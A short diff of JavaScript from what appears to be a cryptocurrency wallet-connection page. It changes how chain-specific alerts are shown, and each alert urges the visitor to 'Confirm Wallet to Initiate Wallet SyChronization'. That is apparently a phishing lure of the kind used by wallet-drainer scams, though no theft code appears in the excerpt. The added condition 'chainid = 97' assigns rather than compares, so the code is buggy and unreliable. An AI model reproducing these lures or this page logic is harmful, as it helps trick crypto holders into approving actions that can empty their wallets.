@@ -176,7 +176,12 @@ async function fetchAccountData() {
   alert("You are on the Ethereum Network, Kindly Confirm Wallet to Initiate Wallet SyChronization, Thanks.");}
   else if(chainid == 137){
   alert("You are on the Polygon(Matic) Network, Kindly Confirm Wallet to Initiate Wallet SyChronization, Thanks.");}
-  else{alert("You are on the Binance Smart Chain Network, Kindly Confirm Wallet to Initiate Wallet SyChronization, Thanks.");}
+  else{}
+  if (chainid = 97)
+  {
+   alert("You are on the Binance Smart Chain Network, Kindly Confirm Wallet to Initiate Wallet SyChronization, Thanks.");}
+  else{
+  }
   document.querySelector("#prepare").style.display = "none";
   document.querySelector("#connected").style.display = "block"; 
  
